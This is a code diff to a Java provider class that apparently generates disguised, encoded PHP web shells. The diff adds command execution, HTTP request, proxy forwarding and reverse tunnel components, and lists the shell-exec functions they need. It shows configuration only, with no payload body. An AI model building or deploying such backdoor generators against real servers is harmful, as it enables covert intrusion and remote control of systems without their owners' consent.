@@ -38,9 +38,10 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
     private static final String REQUEST_SENTINEL = "__LEO_REQUEST_FRAGMENT__";
     private static final String RESPONSE_SENTINEL = "__LEO_RESPONSE_FRAGMENT__";
     private static final List<String> DEFAULT_COMPONENTS = List.of(
-            "BasicInfoComponent", "ExecCommandSimpleComponent", "FileComponent",
+            "BasicInfoComponent", "ExecCommandComponent", "ExecCommandSimpleComponent", "FileComponent",
             "FileDownloadComponent", "FileUploadComponent", "ExecScriptComponent",
-            "DatabaseComponent", "CompressComponent", "DecompressComponent", "PluginComponent");
+            "DatabaseComponent", "CompressComponent", "DecompressComponent", "PluginComponent",
+            "HttpRequestComponent", "ProxyForwardComponent", "ReverseTunnelComponent");
 
     @Override
     public PuppetRuntime getRuntime() {
@@ -61,6 +62,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("defaultOutputMode", OUTPUT_COMPACT);
         metadata.put("components", DEFAULT_COMPONENTS);
         metadata.put("componentDeliveryMode", "on-demand-disk-cache");
+        metadata.put("componentRequirements", componentRequirements());
         metadata.put("bundledComponents", List.of());
         metadata.put("bootstrapEncodings", Map.of(
                 OUTPUT_COMPACT, "minified-php",
@@ -134,6 +136,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("outputMode", outputMode);
         metadata.put("components", components);
         metadata.put("componentDeliveryMode", "on-demand-disk-cache");
+        metadata.put("componentRequirements", componentRequirements());
         metadata.put("bundledComponents", List.of());
         metadata.put("bootstrapEncoding", switch (outputMode) {
             case OUTPUT_PACKED -> "deflate-base64";
@@ -151,6 +154,18 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         List<String> warnings = new ArrayList<>();
         metadata.put("requirements", requirements);
         return new GeneratedArtifact(source, "php", "application/x-httpd-php", metadata, warnings);
+    }
+
+    private Map<String, Object> componentRequirements() {
+        Map<String, Object> common = Map.of(
+                "functions", List.of("stream_select"),
+                "functionsAnyOf", List.of("shell_exec", "exec", "popen"));
+        return Map.of(
+                "DatabaseComponent", Map.of(
+                        "classes", List.of("PDO"),
+                        "pdoDriversAnyOf", List.of("mysql", "pgsql", "sqlsrv", "dblib", "oci", "sqlite")),
+                "ProxyForwardComponent", common,
+                "ReverseTunnelComponent", common);
     }
 
     private Map<String, Object> runtimeRequirements(Disguise requestDisguise, Disguise responseDisguise,
